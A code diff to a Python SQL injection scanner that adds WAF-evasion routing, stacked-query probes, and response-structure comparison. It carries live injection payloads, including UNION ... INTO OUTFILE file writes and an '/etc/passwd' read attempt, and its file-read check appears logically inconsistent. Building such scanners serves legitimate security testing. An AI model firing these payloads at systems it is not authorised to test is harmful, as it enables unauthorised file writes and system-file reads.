@@ -16,6 +16,7 @@ import time
 import re
 import copy
 import statistics
+import uuid
 from typing import Any, Optional
 from urllib.parse import urlparse, parse_qs, urljoin
 
@@ -536,8 +537,7 @@ class SQLiScanner(ScannerBase):
             lower_baseline = baseline_resp.text.lower()
             baseline_sql_errors = {err for err in SQLI_ERRORS if err in lower_baseline}
         for payload in payloads.get("error_based", []):
-            test_url = inject_param(url, param, payload)
-            resp = safe_get(self.session, test_url, self.timeout)
+            resp, used_payload = self._waf_safe_request(url, param, payload, "sqli")
             if not resp:
                 continue
             lower_body = resp.text.lower()
@@ -620,8 +620,7 @@ class SQLiScanner(ScannerBase):
                 break
 
         for payload in payloads.get("union", []):
-            test_url = inject_param(url, param, payload)
-            resp = safe_get(self.session, test_url, self.timeout)
+            resp, used_payload = self._waf_safe_request(url, param, payload, "sqli")
             if not resp:
                 continue
             lower = resp.text.lower()
@@ -655,26 +654,57 @@ class SQLiScanner(ScannerBase):
 
         # ── Blind detection without OOB ─────────────────────────────
         if not oob_host and not signals.get("error") and not signals.get("boolean") and not signals.get("time"):
-            # Cache-based detection: probe twice, check if response differs
-            # (Cached vs non-cached can indicate server-side processing)
-            probe_payloads = ["' OR 1=1--", "1 AND 1=1"]
-            for probe in probe_payloads:
-                probe_url = inject_param(url, param, probe)
-                resp1 = safe_get(self.session, probe_url, self.timeout)
-                resp2 = safe_get(self.session, probe_url, self.timeout)
-                if resp1 and resp2:
-                    r1_len = len(resp1.text)
-                    r2_len = len(resp2.text)
-                    # If responses differ significantly, the query may have
-                    # triggered a different code path on second access (cache write)
-                    if abs(r1_len - r2_len) > 100 and resp1.status_code != resp2.status_code:
-                        signals["blind_cache"] = True
-                        evidence_parts.append("blind:cache-based response difference")
-                        break
+            # Baseline structural fingerprint for comparison
+            baseline_resp = safe_get(self.session, url, self.timeout)
+            baseline_status = baseline_resp.status_code if baseline_resp else 0
+            baseline_headers = dict(baseline_resp.headers) if baseline_resp else {}
+            baseline_cookies = dict(baseline_resp.cookies) if baseline_resp and hasattr(baseline_resp, 'cookies') else {}
+            baseline_len = len(baseline_resp.text) if baseline_resp else 0
 
-            # File-write confirmation: attempt to write a unique marker
-            # via SQL INTO OUTFILE, then read it back
-            if not signals.get("blind_cache"):
+            # ── Stacked query detection ─────────────────────────────
+            stacked_payloads = [
+                f"; SELECT SLEEP(0)--",
+                f"'; SELECT SLEEP(0)--",
+                f"1; SELECT SLEEP(0)--",
+            ]
+            for sp in stacked_payloads:
+                sp_url = inject_param(url, param, sp)
+                sp_resp = safe_get(self.session, sp_url, self.timeout)
+                if sp_resp:
+                    sp_status = sp_resp.status_code
+                    sp_headers = dict(sp_resp.headers)
+                    sp_cookies = dict(sp_resp.cookies) if hasattr(sp_resp, 'cookies') else {}
+                    sp_len = len(sp_resp.text)
+                    # Check for structural differences vs baseline
+                    if sp_status != baseline_status or sp_len != baseline_len:
+                        # Check header deltas
+                        h_diff = False
+                        for k in ('Set-Cookie', 'X-Powered-By', 'Server', 'Location', 'Content-Type'):
+                            if sp_headers.get(k) != baseline_headers.get(k):
+                                h_diff = True
+                                break
+                        if sp_status != baseline_status or h_diff:
+                            signals["blind_stacked"] = True
+                            evidence_parts.append(f"blind:stacked query response structure changed (status {sp_status} vs {baseline_status})")
+                            break
+
+            # ── Cache-based detection ───────────────────────────────
+            if not signals.get("blind_stacked"):
+                probe_payloads = ["' OR 1=1--", "1 AND 1=1"]
+                for probe in probe_payloads:
+                    probe_url = inject_param(url, param, probe)
+                    resp1 = safe_get(self.session, probe_url, self.timeout)
+                    resp2 = safe_get(self.session, probe_url, self.timeout)
+                    if resp1 and resp2:
+                        r1_len = len(resp1.text)
+                        r2_len = len(resp2.text)
+                        if abs(r1_len - r2_len) > 100 and resp1.status_code != resp2.status_code:
+                            signals["blind_cache"] = True
+                            evidence_parts.append("blind:cache-based response difference")
+                            break
+
+            # ── File-write confirmation ─────────────────────────────
+            if not signals.get("blind_stacked") and not signals.get("blind_cache"):
                 marker = f"bbh_{uuid.uuid4().hex[:8]}"
                 blind_payloads = [
                     f"' UNION SELECT '{marker}' INTO OUTFILE '/tmp/bbh_{marker}'--",
@@ -683,10 +713,7 @@ class SQLiScanner(ScannerBase):
                 for bp in blind_payloads:
                     pw_url = inject_param(url, param, bp)
                     safe_get(self.session, pw_url, self.timeout, raise_for_status=False)
-                    read_url = f"file:///tmp/bbh_{marker}"
                     try:
-                        import requests as req
-                        # Try reading via LFI or directory traversal
                         read_test = inject_param(url, param, f"/etc/passwd")
                         r = safe_get(self.session, read_test, self.timeout)
                         if r and marker in r.text:
@@ -695,6 +722,32 @@ class SQLiScanner(ScannerBase):
                             break
                     except Exception:
                         pass
+
+            # ── Response structure comparison ──────────────────────
+            if not signals.get("blind_stacked") and not signals.get("blind_cache") and not signals.get("blind_file"):
+                probe = "' OR '1'='1"
+                struct_url = inject_param(url, param, probe)
+                struct_resp = safe_get(self.session, struct_url, self.timeout)
+                if struct_resp and baseline_resp:
+                    struct_headers = dict(struct_resp.headers)
+                    struct_cookies = dict(struct_resp.cookies) if hasattr(struct_resp, 'cookies') else {}
+                    h_diffs = 0
+                    for k in ('Set-Cookie', 'X-Powered-By', 'Server', 'Location', 'Content-Type', 'WWW-Authenticate'):
+                        bh = baseline_headers.get(k)
+                        sh = struct_headers.get(k)
+                        if sh != bh:
+                            h_diffs += 1
+                    c_diffs = len(set(struct_cookies.keys()) - set(baseline_cookies.keys())) + len(set(baseline_cookies.keys()) - set(struct_cookies.keys()))
+                    if h_diffs > 1 or c_diffs > 0 or struct_resp.status_code != baseline_status:
+                        reasons = []
+                        if h_diffs > 1:
+                            reasons.append(f"{h_diffs} header diffs")
+                        if c_diffs > 0:
+                            reasons.append(f"{c_diffs} cookie diffs")
+                        if struct_resp.status_code != baseline_status:
+                            reasons.append(f"status {struct_resp.status_code} vs {baseline_status}")
+                        signals["blind_response_struct"] = True
+                        evidence_parts.append(f"blind:response structure changed ({'; '.join(reasons)})")
 
         return signals, triggering_response, timing_evidence, evidence_parts
 
